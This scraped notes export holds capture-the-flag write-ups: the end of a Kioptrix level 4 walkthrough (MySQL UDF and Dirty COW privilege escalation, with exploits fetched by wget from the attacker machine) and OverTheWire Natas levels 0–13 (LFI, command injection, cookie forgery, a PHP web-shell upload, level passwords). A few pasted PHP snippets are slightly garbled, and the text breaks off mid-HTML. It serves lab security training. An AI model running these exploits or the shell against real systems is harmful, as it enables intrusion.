/var/www/john/john.php \u0026lt;?php session_start(); if(!session_is_registered(myusername)){ header(\u0026quot;location:../index.php\u0026quot;); }else{ ob_start(); $host=\u0026quot;localhost\u0026quot;; // Host name $username=\u0026quot;root\u0026quot;; // Mysql username $password=\u0026quot;\u0026quot;; // Mysql password $db_name=\u0026quot;members\u0026quot;; // Database name $tbl_name=\u0026quot;members\u0026quot;; // Table name ... mysql -u root Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 35 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu) Type 'help;' or '\\h' for help. Type '\\c' to clear the buffer. mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | members | | mysql | +--------------------+ 3 rows in set (0.00 sec) mysql\u0026gt; show tables from members; +-------------------+ | Tables_in_members | +-------------------+ | members | +-------------------+ 1 row in set (0.00 sec) mysql\u0026gt; use members Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; select * from members; +----+----------+-----------------------+ | id | username | password | +----+----------+-----------------------+ | 1 | john | MyNameIsJohn | | 2 | robert | ADGAdsafdfwt4gadfga== | +----+----------+-----------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; exit robert@Kioptrix4:~$ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 8.04.3 LTS Release: 8.04 Codename: hardy robert@Kioptrix4:~$ uname -a Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux robert@Kioptrix4:~$ ps aux | grep mysql root 4825 0.0 0.0 1772 528 ? S 11:14 0:00 /bin/sh /usr/bin/mysqld_safe root 4867 0.0 1.5 126988 16340 ? Sl 11:14 0:06 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-ext root 4869 0.0 0.0 1700 560 ? S 11:14 0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld root@kali:~/kioptrix/level4/UDF# searchsploit -m exploits/linux/local/1518.c Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) URL: https://www.exploit-db.com/exploits/1518 Path: /usr/share/exploitdb/exploits/linux/local/1518.c File Type: C source, ASCII text, with CRLF line terminators Copied to: /root/kioptrix/level4/UDF/1518.c root@kali:~/kioptrix/level4/UDF# root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c^C root@kali:~/kioptrix/level4/UDF# mv 1518.c raptor_udf2.c root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c root@kali:~/kioptrix/level4/UDF# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc root@kali:~/kioptrix/level4/UDF# ls -la total 40 drwxr-xr-x 2 root root 4096 Jan 4 22:23 . drwxr-xr-x 4 root root 4096 Jan 4 22:21 .. -rw-r--r-- 1 root root 3378 Jan 4 22:22 raptor_udf2.c -rw-r--r-- 1 root root 7232 Jan 4 22:23 raptor_udf2.o -rwxr-xr-x 1 root root 19120 Jan 4 22:23 raptor_udf2.so root@kali:~/kioptrix/level4/UDF# python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... robert@Kioptrix4:~$ wget http://192.168.88.128:8000/raptor_udf2.so --15:15:28-- http://192.168.88.128:8000/raptor_udf2.so =\u0026gt; `raptor_udf2.so` Connecting to 192.168.88.128:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 19,120 (19K) [application/octet-stream] 100%[==========================================================================================================================================\u0026gt;] 19,120 --.--K/s 15:15:28 (164.09 MB/s) - `raptor_udf2.so' saved [19120/19120] robert@Kioptrix4:~$ mysql -u root Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 37 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu) Type 'help;' or '\\h' for help. Type '\\c' to clear the buffer. mysql\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; create table foo(line blob); Query OK, 0 rows affected (0.01 sec) mysql\u0026gt; insert into foo values(load_file('/home/robert/raptor_udf2.so')); Query OK, 1 row affected (0.01 sec) mysql\u0026gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so'; Query OK, 1 row affected (0.00 sec) mysql\u0026gt; create function do_system returns integer soname 'raptor_udf2.so'; ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 22 raptor_udf2.so: wrong ELF class: ELFCLASS64) ^C Keyboard interrupt received, exiting. root@kali:~/kioptrix/level4/UDF# ls raptor_udf2.c raptor_udf2.o raptor_udf2.so root@kali:~/kioptrix/level4/UDF# mkdir 64 root@kali:~/kioptrix/level4/UDF# mv * 64 mv: cannot move '64' to a subdirectory of itself, '64/64' root@kali:~/kioptrix/level4/UDF# cp 64/raptor_udf2.c . root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c -m32 root@kali:~/kioptrix/level4/UDF# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc -m32 root@kali:~/kioptrix/level4/UDF# python3 -m http.server robert@Kioptrix4:~$ rm raptor_udf2.so robert@Kioptrix4:~$ wget http://192.168.88.128:8000/raptor_udf2.so --15:20:13-- http://192.168.88.128:8000/raptor_udf2.so =\u0026gt; `raptor_udf2.so' Connecting to 192.168.88.128:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 17,944 (18K) [application/octet-stream] 100%[==========================================================================================================================================\u0026gt;] 17,944 --.--K/s 15:20:13 (23.32 MB/s) - `raptor_udf2.so' saved [17944/17944] robert@Kioptrix4:~$ mysql -u root Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 40 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu) Type 'help;' or '\\h' for help. Type '\\c' to clear the buffer. mysql\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; drop table foo; Query OK, 0 rows affected (0.00 sec) mysql\u0026gt; create table foo(line blob); Query OK, 0 rows affected (0.01 sec) mysql\u0026gt; insert into foo values(load_file('/home/robert/raptor_udf2.so')); Query OK, 1 row affected (0.00 sec) mysql\u0026gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so'; ERROR 1086 (HY000): File '/usr/lib/raptor_udf2.so' already exists mysql\u0026gt; select * from foo into dumpfile '/usr/lib/raptor_udf2_32.so'; Query OK, 1 row affected (0.00 sec) mysql\u0026gt; create function do_system returns integer soname 'raptor_udf2_32.so'; Query OK, 0 rows affected (0.01 sec) mysql\u0026gt; select * from mysql.func; +-----------------------+-----+---------------------+----------+ | name | ret | dl | type | +-----------------------+-----+---------------------+----------+ | lib_mysqludf_sys_info | 0 | lib_mysqludf_sys.so | function | | sys_exec | 0 | lib_mysqludf_sys.so | function | | do_system | 2 | raptor_udf2_32.so | function | +-----------------------+-----+---------------------+----------+ 3 rows in set (0.00 sec) mysql\u0026gt; select do_system('id \u0026gt; /tmp/out; chown robert.robert /tmp/out'); +----------------------------------------------------------+ | do_system('id \u0026gt; /tmp/out; chown robert.robert /tmp/out') | +----------------------------------------------------------+ | 8589934592 | +----------------------------------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt; \\! bash robert@Kioptrix4:~$ cat /tmp/out uid=0(root) gid=0(root)  root@kali:~/kioptrix/level4/dirtycow# gcc -pthread dirty.c -o dirty -lcrypt -m32 root@kali:~/kioptrix/level4/dirtycow# python3 -m http.server robert@Kioptrix4:~$ wget http://192.168.88.128:8000/dirty --14:47:51-- http://192.168.88.128:8000/dirty =\u0026gt; `dirty' Connecting to 192.168.88.128:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 16,744 (16K) [application/octet-stream] 100%[==========================================================================================================================================\u0026gt;] 16,744 --.--K/s 14:47:51 (20.38 MB/s) - `dirty' saved [16744/16744] robert@Kioptrix4:~$ chmod +x dirty robert@Kioptrix4:~$ ./dirty /etc/passwd successfully backed up to /tmp/passwd.bak Please enter the new password: Complete line: firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash mmap: b7fa5000 root@kali:~# ssh firefart@192.168.88.132 firefart@192.168.88.132's password: Failed to add entry for user firefart. Welcome to LigGoat Security Systems - We are Watching firefart@Kioptrix4:~# id uid=0(firefart) gid=0(root) groups=0(root)  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/overthewire/natasa/",
	"title": "Natasa",
	"tags": ["OverTheWire"],
	"description": "Notes from Bandit Natasa.",
	"content": "natasa Natas0 view-source:http://natas0.natas.labs.overthewire.org/ the password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto  Natas1 view-source:http://natas1.natas.labs.overthewire.org/ the password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi  Natas2 view-source:http://natas2.natas.labs.overthewire.org/files/pixel.png http://natas2.natas.labs.overthewire.org/files/ http://natas2.natas.labs.overthewire.org/files/users.txt # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH  natas 3 http://natas3.natas.labs.overthewire.org/robots.txt http://natas3.natas.labs.overthewire.org/s3cr3t/ http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ  Natas 4 Access disallowed. You are visiting from \u0026quot;\u0026rdquo; while authorized users should come only from \u0026ldquo;http://natas5.natas.labs.overthewire.org/\u0026rdquo;\nF12 -\u0026gt; network -\u0026gt; reload page -\u0026gt; edit headers Add following Referer: http://natas5.natas.labs.overthewire.org/ resend Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq  Natas 5 Access disallowed. You are not logged in\nF12 -\u0026gt; network -\u0026gt; load page -\u0026gt; look at cookie header. Cookie: __cfduid=d95a9db8b02c419d414e69605e6cd5dc81557856656; loggedin=0 Change loggedin=0 to loggedin=1 resend Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1  natas 6 Click on view source code. This gives us 1 script  include \u0026quot;includes/secret.inc\u0026quot;; if(array_key_exists(\u0026quot;submit\u0026quot;, $_POST)) { if($secret == $_POST['secret']) { print \u0026quot;Access granted. The password for natas7 is \u0026lt;censored\u0026gt;\u0026quot;; } else { print \u0026quot;Wrong secret\u0026quot;; } } ?\u0026gt;  If POST = $Secret -\u0026gt; Access granted. Where is secrect ? Look at include view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc  \u0026lt;? $secret = \u0026quot;FOEIUWGHFEEUHOFUOIU\u0026quot;; ?\u0026gt;  Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9  Natas 7 View source hint: password for webuser natas8 is in /etc/natas_webpass/natas8  \u0026lt;a href=\u0026quot;index.php?page=home\u0026quot;\u0026gt;Home\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026quot;index.php?page=about\u0026quot;\u0026gt;About\u0026lt;/a\u0026gt;  HREFs look vulnerable to LFI\nhttp://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/natas_webpass/natas8  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe\nNatas 8 click view source\n\u0026lt;? $encodedSecret = \u0026quot;3d3d516343746d4d6d6c315669563362\u0026quot;; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\u0026quot;submit\u0026quot;, $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \u0026quot;Access granted. The password for natas9 is \u0026lt;censored\u0026gt;\u0026quot;; } else { print \u0026quot;Wrong secret\u0026quot;; } } ?\u0026gt;  A string has been encoded with the function encodeSecret.\nbase64_encode — Encodes data with MIME base64\nhttps://www.php.net/base64_encode\nstrrev — Reverse a string\nhttps://www.php.net/manual/en/function.strrev.php\nbin2hex — Convert binary data into hexadecimal representation\nhttps://www.php.net/manual/en/function.bin2hex.php\nWe need to create a decodeSecret function. Lets find commands to reverse the encoding.\nbase64_decode\nhttps://www.php.net/manual/en/function.base64-decode.php\nstring reverse\nhttps://www.php.net/manual/en/function.strrev.php\nhex2bin\nhttps://www.php.net/manual/en/function.hex2bin.php\n$encodedSecret = \u0026quot;3d3d516343746d4d6d6c315669563362\u0026quot;; function dencodeSecret($secret) { return base64_decode(strrev(hex2bin($secret))); } echo dencodeSecret($encodedSecret); [Running] php \u0026quot;c:\\_git\\github\\tempCodeRunnerFile.php\u0026quot; oubWYf2kBq [Done] exited with code=0 in 0.154 seconds  Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl  natas 9 view source\n$key = \u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;needle\u0026quot;, $_REQUEST)) { $key = $_REQUEST[\u0026quot;needle\u0026quot;]; } if($key != \u0026quot;\u0026quot;) { passthru(\u0026quot;grep -i $key dictionary.txt\u0026quot;); }  No input validation. We can do command injection. lets just add a additional file to grep and search for something that is likely to be in the password.\n1 /etc/natas_webpass/natas10  Output: /etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu  natas10 view source\n$key = \u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;needle\u0026quot;, $_REQUEST)) { $key = $_REQUEST[\u0026quot;needle\u0026quot;]; } if($key != \u0026quot;\u0026quot;) { if(preg_match('/[;|\u0026amp;]/',$key)) { print \u0026quot;Input contains an illegal character!\u0026quot;; } else { passthru(\u0026quot;grep -i $key dictionary.txt\u0026quot;); } }  now there is some input validation to avoid things like ; | and \u0026amp;, but our trick from natas09 still works here.\n1 /etc/natas_webpass/natas11  Output: /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK  natas11 Cookies are protected with XOR encryption\nview source\n$defaultdata = array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;no\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;); function xor_encrypt($in) { $key = '\u0026lt;censored\u0026gt;'; $text = $in; $outText = ''; 1 /etc/natas_webpass/natas11 // Iterate through eac1 /etc/natas_webpass/natas11h character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\u0026quot;data\u0026quot;, $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\u0026quot;data\u0026quot;])), true); if(is_array($tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026quot;showpassword\u0026quot;, $tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026quot;bgcolor\u0026quot;, $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } function saveData($d) { setcookie(\u0026quot;data\u0026quot;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\u0026quot;bgcolor\u0026quot;,$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); \u0026lt;? if($data[\u0026quot;showpassword\u0026quot;] == \u0026quot;yes\u0026quot;) { print \u0026quot;The password for natas12 is \u0026lt;censored\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; } ?\u0026gt;  Set-Cookie\ndata=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D  Cookie\n__cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmb=176859643.2.10.1568619071; __utmc=176859643; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D  #ffffff ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=  #131516 ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRgt7REYOaAw=  #141617 ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRgx7R0YPaAw=  It seems the color code is in the cookie.\nLets reuse the PHP code given to us and update it.\nfunction xor_t_k($intext,$inkey) { $key = $inkey; $text = $intext; $outText = ''; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } $defaultdata = array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;no\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;); $JsonData = json_encode($defaultdata); $_COOKIE = array(\u0026quot;__cfduid\u0026quot; =\u0026gt; \u0026quot;dc2e23c92b1d237ff6fcd21eeaace26841568619071\u0026quot;, \u0026quot;__utma\u0026quot; =\u0026gt; \u0026quot;176859643.1037695426.1568619071.1568619071.1568619071.1\u0026quot;, \u0026quot;__utmb\u0026quot; =\u0026gt; \u0026quot;176859643.2.10.1568619071; __utmc=176859643\u0026quot;, \u0026quot;__utmz\u0026quot; =\u0026gt; \u0026quot;176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\u0026quot;, \u0026quot;utmt\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;, \u0026quot;data\u0026quot; =\u0026gt; \u0026quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=\u0026quot; ); $basedecoded = base64_decode($_COOKIE[\u0026quot;data\u0026quot;]); # print $basedecoded; # print $JsonData; $XOR_Key = xor_t_k($JsonData, $basedecoded); print $XOR_Key;  [Running] php \u0026quot;/home/justin-p/tempCodeRunnerFile.php\u0026quot; qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq [Done] exited with code=0 in 0.022 seconds  function xor_encrypt($in) { $key = 'qw8J'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } $_COOKIE = array(\u0026quot;__cfduid\u0026quot; =\u0026gt; \u0026quot;dc2e23c92b1d237ff6fcd21eeaace26841568619071\u0026quot;, \u0026quot;__utma\u0026quot; =\u0026gt; \u0026quot;176859643.1037695426.1568619071.1568619071.1568619071.1\u0026quot;, \u0026quot;__utmb\u0026quot; =\u0026gt; \u0026quot;176859643.2.10.1568619071; __utmc=176859643\u0026quot;, \u0026quot;__utmz\u0026quot; =\u0026gt; \u0026quot;176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\u0026quot;, \u0026quot;utmt\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;, \u0026quot;data\u0026quot; =\u0026gt; \u0026quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=\u0026quot; ); $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\u0026quot;data\u0026quot;])), true); print print_r($tempdata, true);  [Running] php \u0026quot;/home/justin-p/tempCodeRunnerFile.php\u0026quot; Array ( [showpassword] =\u0026gt; no [bgcolor] =\u0026gt; #ffffff ) [Done] exited with code=0 in 0.021 seconds  function xor_encrypt($in) { $key = 'qw8J'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } $pass_yes = array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;yes\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;); $json_pass_yes = json_encode($pass_yes); #print $json_pass_yes; $xor_pass_yes = xor_encrypt($json_pass_yes); #print $xor_pass_yes; $base_pass_yes = base64_encode($xor_pass_yes); print $base_pass_yes;  [Running] php \u0026quot;/home/justin-p/tempCodeRunnerFile.php\u0026quot; ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK [Done] exited with code=0 in 0.018 seconds  function xor_encrypt($in) { $key = 'qw8J'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } $pass_yes = array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;yes\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;); $json_pass_yes = json_encode($pass_yes); #print $json_pass_yes; $xor_pass_yes = xor_encrypt($json_pass_yes); #print $xor_pass_yes; $base_pass_yes = base64_encode($xor_pass_yes); $_COOKIE = elserray(\u0026quot;__cfduid\u0026quot; =\u0026gt; \u0026quot;dc2e23c92b1d237ff6fcd21eeaace26841568619071\u0026quot;, \u0026quot;__utma\u0026quot; =\u0026gt;else\u0026quot;176859643.1037695426.1568619071.1568619071.1568619071.1\u0026quot;, \u0026quot;__utmb\u0026quot; =\u0026gt; \u0026quot;176859643.2.10.1568619071; __utmc=176859643\u0026quot;, \u0026quot;__utmz\u0026quot; =\u0026gt; \u0026quot;176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\u0026quot;, \u0026quot;utmt\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;, \u0026quot;data\u0026quot; =\u0026gt; \u0026quot;$base_pass_yes\u0026quot; ); $defaultdata = array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;no\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;); function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\u0026quot;data\u0026quot;, $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\u0026quot;data\u0026quot;])), true); if(is_array($tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026quot;showpassword\u0026quot;, $tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026quot;bgcolor\u0026quot;, $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } $data = loadData($defaultdata); if($data[\u0026quot;showpassword\u0026quot;] == \u0026quot;yes\u0026quot;) { print \u0026quot;The password for natas12 is \u0026lt;censored\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; }  [Running] php \u0026ldquo;/home/justin-p/tempCodeRunnerFile.php\u0026rdquo; The password for natas12 is\n[Done] exited with code=0 in 0.02 seconds\ndocument.cookie = \u0026quot;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK\u0026quot;;  or use burp\nThe password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3  function xor_encrypt($in) { $key = base64_decode(\u0026quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw\u0026quot;); $text = $in; $outText = ''; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } echo xor_encrypt(json_encode(array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;no\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;))); function xor_encrypt($in) { $key = 'qw8J'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } echo base64_encode(xor_encrypt(json_encode(array( \u0026quot;showpassword\u0026quot;=\u0026gt;\u0026quot;yes\u0026quot;, \u0026quot;bgcolor\u0026quot;=\u0026gt;\u0026quot;#ffffff\u0026quot;))));  natas12 \u0026lt;? function genRandomString() { $length = 10; $characters = \u0026quot;0123456789abcdefghijklmnopqrstuvwxyz\u0026quot;; $string = \u0026quot;\u0026quot;; for ($p = 0; $p \u0026lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\u0026quot;/\u0026quot;.genRandomString().\u0026quot;.\u0026quot;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\u0026quot;filename\u0026quot;, $_POST)) { $target_path = makeRandomPathFromFilename(\u0026quot;upload\u0026quot;, $_POST[\u0026quot;filename\u0026quot;]); if(filesize($_FILES['uploadedfile']['tmp_name']) \u0026gt; 1000) { echo \u0026quot;File is too big\u0026quot;; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo \u0026quot;The file \u0026lt;a href=\\\u0026quot;$target_path\\\u0026quot;\u0026gt;$target_path\u0026lt;/a\u0026gt; has been uploaded\u0026quot;; } else{ echo \u0026quot;There was an error uploading the file, please try again!\u0026quot;; } } } else { ?\u0026gt; \u0026lt;form enctype=\u0026quot;multipart/form-data\u0026quot; action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;MAX_FILE_SIZE\u0026quot; value=\u0026quot;1000\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;filename\u0026quot; value=\u0026quot;\u0026lt;? print genRandomString(); ?\u0026gt;.jpg\u0026quot; /\u0026gt; Choose a JPEG to upload (max 1KB):\u0026lt;br/\u0026gt; \u0026lt;input name=\u0026quot;uploadedfile\u0026quot; type=\u0026quot;file\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Upload File\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;? } ?\u0026gt; \u0026lt;div id=\u0026quot;viewsource\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;index-source.html\u0026quot;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  No filetype valiation.\nSimple PHP shell\n\u0026lt;!-- By justin-p (https://raw.githubusercontent.com/justin-p/sec-stuff/master/php/simple_shell/simple_shell.php) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ --\u0026gt; \u0026lt;?php if (empty($_POST['cmd'])) {$cmd = \u0026quot;\u0026quot;;} elseif (!empty($_POST['cmd'])) {$cmd = shell_exec($_POST['cmd']);} ?\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot;\u0026gt;\u0026lt;input type=\u0026quot;text\u0026quot; style=\u0026quot;width:100%;height:25px;\u0026quot; name=\u0026quot;cmd\u0026quot; id=\u0026quot;cmd\u0026quot; value=\u0026quot;\u0026lt;?php if (!empty($_POST['cmd'])) {htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');} ?\u0026gt;\u0026quot; required\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt;Execute\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;?php if (!$cmd \u0026amp;\u0026amp; $_SERVER['REQUEST_METHOD'] != 'POST'): ?\u0026gt;\u0026lt;small\u0026gt;Enter command.\u0026lt;/small\u0026gt; \u0026lt;?php elseif ($cmd): ?\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;?php elseif (!$cmd \u0026amp;\u0026amp; $_SERVER['REQUEST_METHOD'] == 'POST'): ?\u0026gt;\u0026lt;small\u0026gt;No results.\u0026lt;/small\u0026gt; \u0026lt;?php endif; ?\u0026gt;  Now we just need to update the file name\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;filename\u0026quot; value=\u0026quot;\u0026lt;? print genRandomString(); ?\u0026gt;.jpg\u0026quot; /\u0026gt;  to\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;filename\u0026quot; value=\u0026quot;\u0026lt;? print genRandomString(); ?\u0026gt;.php\u0026quot; /\u0026gt;  We can do this with Burp or F12 -\u0026gt; network -\u0026gt; headers -\u0026gt; edit and resend\nContent-Disposition: form-data; name=\u0026quot;filename\u0026quot; zpfrokehzg.php  The file upload/zpfrokehzg.php has been uploaded  From here we can simply use the shell to cat the file\njmLTY0qiPZBbaKc9341cqPQZBJv7MQbY  natas13 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/level.css\u0026quot;\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026quot; /\u0026gt; \u0026lt;link 